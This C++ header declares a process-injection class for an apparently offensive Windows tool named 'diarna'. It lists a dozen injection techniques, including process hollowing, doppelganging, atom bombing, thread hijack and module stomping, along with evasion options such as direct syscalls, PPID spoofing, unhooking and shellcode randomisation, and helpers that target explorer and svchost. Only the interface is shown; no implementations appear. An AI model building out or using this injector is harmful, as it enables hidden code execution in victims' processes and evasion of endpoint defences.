#pragma once
#include <diarna/compiler_port.hpp>
#include <cstdint>
#include <vector>
#include <span>
#include <string>
#include <functional>

namespace diarna::exec {

enum class InjectionMethod {
    CreateRemoteThread,
    NtCreateThreadEx,
    QueueUserAPC,
    SetWindowsHookEx,
    ThreadHijack,
    AtomBombing,
    ProcessHollowing,
    ProcessDoppelganging,
    ModuleStomping,
    EarlyBirdAPC,
    APCThreadHijack,
    TransactedHollowing,
    COUNT
};

struct InjectionConfig {
    InjectionMethod method = InjectionMethod::CreateRemoteThread;
    uint32_t target_pid = 0;
    std::wstring target_process;
    bool randomize_method = true;
    bool use_syscalls = true;
    bool ppid_spoofing = false;
    bool block_dll_policy = true;
    bool unhook_target = true;
    bool randomize_dll_name = true;
    uint32_t sleep_before_resume_ms = 0;
};

class ProcessInjector {
public:
    static ProcessInjector& instance();

    bool inject(std::span<const uint8_t> shellcode,
                const InjectionConfig& config = {});

    bool inject_dll(const std::wstring& dll_path,
                    const InjectionConfig& config = {});

    bool hollow_and_inject(const std::wstring& target_exe,
                           std::span<const uint8_t> payload);

    bool doppelgang_and_inject(const std::wstring& target_exe,
                                std::span<const uint8_t> payload);

    uint32_t find_explorer_pid();
    uint32_t find_svchost_pid();
    uint32_t find_process_by_name(const std::wstring& name);

    struct InjectionStats {
        uint64_t total_attempts;
        uint64_t successful;
        uint64_t methods_used[(size_t)InjectionMethod::COUNT];
    };
    InjectionStats stats() const;

private:
    ProcessInjector() = default;

    bool inject_crt(std::span<const uint8_t> sc, HANDLE proc);
    bool inject_ntcrt(std::span<const uint8_t> sc, HANDLE proc);
    bool inject_apc(std::span<const uint8_t> sc, HANDLE proc, DWORD pid);
    bool inject_hook(std::span<const uint8_t> sc);
    bool inject_hijack(std::span<const uint8_t> sc, HANDLE proc, DWORD pid);
    bool inject_atom_bombing(std::span<const uint8_t> sc, DWORD pid);
    bool inject_early_bird(std::span<const uint8_t> sc, const std::wstring& target);
    bool inject_module_stomp(std::span<const uint8_t> sc, HANDLE proc);

    HANDLE open_target_process(const InjectionConfig& config);
    bool spawn_suspended(const std::wstring& path, PROCESS_INFORMATION& pi);
    void randomize_shellcode(std::vector<uint8_t>& sc, uint32_t seed);
    InjectionMethod pick_method(const InjectionConfig& config);

    InjectionStats stats_;
};

} // namespace diarna::exec
